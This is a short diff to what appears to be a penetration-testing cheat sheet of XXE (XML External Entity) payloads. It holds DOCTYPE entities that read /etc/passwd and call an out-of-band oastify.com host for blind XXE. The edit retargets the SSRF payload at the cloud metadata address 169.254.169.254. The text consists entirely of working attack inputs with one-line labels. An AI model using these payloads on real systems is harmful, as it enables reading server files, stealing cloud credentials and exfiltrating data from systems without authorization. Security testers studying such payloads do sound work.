@@ -3,7 +3,7 @@
 ```xml
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  >> For retrieving server files.
 
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website/"> ]>  >> For SSRF attack.
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>  >> For SSRF attack.
 
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://zhkjg0n2ikpienyuf43fiyvuelkc82wr.oastify.com"> ]>  >> For Blind xxe attack.
 &xxe;
